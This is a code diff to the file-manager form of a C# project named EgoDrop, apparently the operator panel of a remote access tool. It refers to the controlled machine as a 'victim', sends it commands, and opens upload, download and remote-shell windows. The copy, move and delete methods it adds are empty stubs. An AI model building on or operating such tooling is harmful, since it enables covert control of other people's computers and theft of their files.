@@ -12,6 +12,7 @@ namespace EgoDrop
 {
     public partial class frmFileMgr : Form
     {
+        public clsAgent m_agent { get; init; }
         public clsVictim m_victim { get; set; }
         public string m_szVictimID { get; init; }
 
@@ -80,14 +81,15 @@ namespace EgoDrop
             }
         }
 
-        public frmFileMgr(string szVictimID, clsVictim victim, bool bUnixLike)
+        public frmFileMgr(clsAgent agent)
         {
             InitializeComponent();
 
-            m_szVictimID = szVictimID;
-            m_victim = victim;
+            m_agent = agent;
+            m_szVictimID = agent.m_szVictimID;
+            m_victim = agent.m_victim;
             m_szInitDir = string.Empty;
-            m_bIsUnixLike = bUnixLike;
+            m_bIsUnixLike = agent.m_bUnixlike;
 
             Text = $"FileMgr[{m_szVictimID}] | {(m_bIsUnixLike ? "Linux-like" : "Windows")}";
         }
@@ -568,20 +570,118 @@ namespace EgoDrop
             fnGoto(szCurrentPath);
         }
 
+        /// <summary>
+        /// Set file clipboard.
+        /// </summary>
+        /// <param name="lsInfo">Entity list.</param>
+        private void fnSetClipboard(List<stFileInfo> lsInfo)
+        {
+            TreeNode nodeFolders;
+            TreeNode nodeFiles;
 
+            if (treeView2.Nodes.Count == 0)
+            {
+                nodeFolders = new TreeNode("Folder");
+                nodeFiles = new TreeNode("File");
+            }
+            else
+            {
+                nodeFolders = treeView2.Nodes[0];
+                nodeFiles = treeView2 .Nodes[1];
+            }
+
+            nodeFolders.Nodes.Clear();
+            nodeFiles.Nodes.Clear();
+
+            foreach (var info in lsInfo)
+            {
+                (info.bDirectory ? nodeFolders : nodeFiles).Nodes.Add(new TreeNode()
+                {
+                    Text = info.szFileName,
+                    Tag = info,
+                });
+            }
+        }
+
+        /// <summary>
+        /// Get entity list from clipboard.
+        /// </summary>
+        /// <returns></returns>
+        private List<stFileInfo> fnGetClipboard()
+        {
+            if (treeView2.Nodes.Count == 0)
+            {
+                MessageBox.Show("Initialization error.", "fnGetClipboard()", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                return new List<stFileInfo>();
+            }
+
+            TreeNode nodeFolders = treeView2.Nodes[0];
+            TreeNode nodeFiles = treeView2.Nodes[1];
+
+            List<stFileInfo> lsInfo = nodeFolders.Nodes.Cast<TreeNode>()
+                .Concat(nodeFiles.Nodes.Cast<TreeNode>())
+                .Select(x => (stFileInfo)x.Tag).ToList();
+
+            return lsInfo;
+        }
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="szSrcEntity"></param>
+        /// <param name="szDstEntity"></param>
+        /// <param name="bIsDir"></param>
         public void fnCopy(string szSrcEntity, string szDstEntity, bool bIsDir)
         {
 
         }
 
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="lsInfo"></param>
+        /// <param name="szDstDir"></param>
+        private void fnCopy(List<stFileInfo> lsInfo, string szDstDir)
+        {
 
+        }
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="szSrcEntity"></param>
+        /// <param name="szDstEntity"></param>
+        /// <param name="bIsDir"></param>
         public void fnMove(string szSrcEntity, string szDstEntity, bool bIsDir)
         {
 
         }
 
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="lsInfo"></param>
+        /// <param name="szDstDir"></param>
+        private void fnMove(List<stFileInfo> lsInfo, string szDstDir)
+        {
 
+        }
+
+        /// <summary>
+        /// Delete file.
+        /// </summary>
+        /// <param name="szPath">Target file path.</param>
+        /// <param name="bIsDir">Is directory?</param>
         public void fnDelete(string szPath, bool bIsDir)
+        {
+
+        }
+
+        /// <summary>
+        /// Delete entities.
+        /// </summary>
+        /// <param name="lsInfo"></param>
+        private void fnDelete(List<stFileInfo> lsInfo)
         {
 
         }
@@ -590,6 +690,8 @@ namespace EgoDrop
 
         private void fnSetup()
         {
+            fnSetClipboard(new List<stFileInfo>());
+
             m_victim.fnSendCommand(m_szVictimID, "file|init");
             m_victim.m_listener.evtReceivedMessage += fnRecvMsg;
         }
@@ -796,7 +898,7 @@ namespace EgoDrop
             {
                 List<string> lsFile = ofd.FileNames.ToList();
 
-                frmFileTransfer f = new frmFileTransfer(m_victim, lsFile, frmFileTransfer.enTransfer.Upload);
+                frmFileTransfer f = new frmFileTransfer(m_agent, lsFile, clsFileHandler.enMode.Upload);
                 f.Show();
             }
         }
@@ -821,7 +923,7 @@ namespace EgoDrop
                 }
             }
 
-            frmFileTransfer f = new frmFileTransfer(m_victim, lsFile, frmFileTransfer.enTransfer.Download);
+            frmFileTransfer f = new frmFileTransfer(m_agent, lsFile, clsFileHandler.enMode.Download);
             f.Show();
         }
 
@@ -855,6 +957,34 @@ namespace EgoDrop
                 return;
 
             treeView1.SelectedNode = node.Parent;
+        }
+
+        private void toolStripButton3_Click(object sender, EventArgs e)
+        {
+            frmShell f = clsTools.fnFindForm<frmShell>(m_victim, m_szVictimID);
+            if (f == null)
+            {
+                f = new frmShell(m_agent, m_szCurrentPath);
+                f.Show();
+            }
+            else
+            {
+                f.BringToFront();
+            }
+        }
+
+        private void toolStripMenuItem21_Click(object sender, EventArgs e)
+        {
+            frmShell f = clsTools.fnFindForm<frmShell>(m_victim, m_szVictimID);
+            if (f == null)
+            {
+                f = new frmShell(m_agent, m_szCurrentPath);
+                f.Show();
+            }
+            else
+            {
+                f.BringToFront();
+            }
         }
     }
 }
